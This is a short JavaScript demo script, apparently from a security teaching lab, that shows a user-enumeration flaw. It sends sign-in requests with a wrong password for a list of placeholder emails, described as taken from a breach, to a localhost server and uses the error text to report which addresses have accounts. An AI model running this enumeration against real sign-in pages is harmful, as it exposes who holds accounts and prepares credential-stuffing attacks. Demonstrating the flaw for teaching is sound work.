// demo0/enumerate.mjs — hole 2: the error message tells a stranger which emails have an account.
const BASE = process.env.BASE ?? 'http://localhost:4800';
const leaked = [ // e.g. from another site's breach
  'an@student.labflow.example', 'minh@student.labflow.example', 'binh@student.labflow.example',
  'hoa@student.labflow.example', 'lan@labflow.example', 'admin@labflow.example',
];
for (const email of leaked) {
  const res = await fetch(BASE + '/sign-in', {
    method: 'POST', headers: { 'content-type': 'application/json' },
    body: JSON.stringify({ email, password: 'not-the-password' }),
  });
  const { error } = await res.json();
  console.log(error === 'Wrong password' ? 'HAS AN ACCOUNT ' : 'no account     ', email, '←', JSON.stringify(error));
}
